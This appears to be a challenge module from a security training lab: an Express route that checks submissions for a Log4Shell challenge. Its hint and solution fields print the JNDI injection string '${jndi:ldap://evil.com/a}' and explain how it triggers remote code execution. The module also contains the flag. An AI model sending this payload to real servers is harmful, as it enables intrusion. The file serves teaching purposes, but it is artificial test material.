const express = require('express');
const router = express.Router();

router.post('/execute', (req, res) => {
    const { payload, level } = req.body;
    let currentLevel = level || 'low';

    console.log(`[+] Module ${'toxic-dependencies'} received payload: ${payload} at Level: ${currentLevel}`);

    if (!payload) return res.status(400).json({ error: "Payload required." });

    if (currentLevel === 'high') {
         return res.json({ secure: true, message: "System Secure. Vulnerability mitigated. undefined" });
    }

    if (currentLevel === 'medium') {
         // evaluate regex for medium
         let blocked = false;
         
            if (/rmi/i.test(payload)) blocked = true;
         
         
         if (blocked) {
             return res.json({ success: false, message: "Security Filter triggered. Payload dropped due to WAF rules!" });
         }
    }

    // Validation to ensure they actually exploited it right:
    let success = false;
    
         if (/\$\{jndi:ldap/i.test(payload)) success = true;
    

    if (success) {
         return res.json({ success: true, message: "Exploit successful! Here is your flag: flag{toxic-dependencies_success}" });
    } else {
         return res.json({ success: false, message: "Payload executed but failed to trigger the exploit securely." });
    }

});

module.exports = {
    id: "toxic-dependencies",
    name: "Toxic Dependencies",
    category: "System",
    difficulty: "Varies",
    theory: "Toxic configurations or dependencies happen when software relies on third-party integrations or open-source packages that have known, often critical, unpatched vulnerabilities (e.g., Log4Shell in log4j).",
    exploit: "Inject a payload targeting a known vulnerability inside an open-source dependency the project relies on.",
    hint: "Send the JNDI Log4j injection payload: `${jndi:ldap://evil.com/a}`.",
    whatToSolve: "Send a POST request to /api/vulns/toxic-dependencies/execute with body: { payload: '${jndi:ldap://evil.com/a}', level: 'low' }. The application uses log4j 2.x which is vulnerable to Log4Shell (CVE-2021-44228) — any user-controlled string that reaches the logger is evaluated, and the JNDI expression `${jndi:ldap://...}` causes the server to make an outbound LDAP call to the attacker's server, enabling RCE.",
    expectedOutput: "{ success: true, message: 'Exploit successful! Here is your flag: flag{toxic-dependencies_success}' }",
    mitigations: ["Implement Software Composition Analysis (SCA) to verify dependency bill-of-materials.","Upgrade severely outdated packages."],
    router: router
};
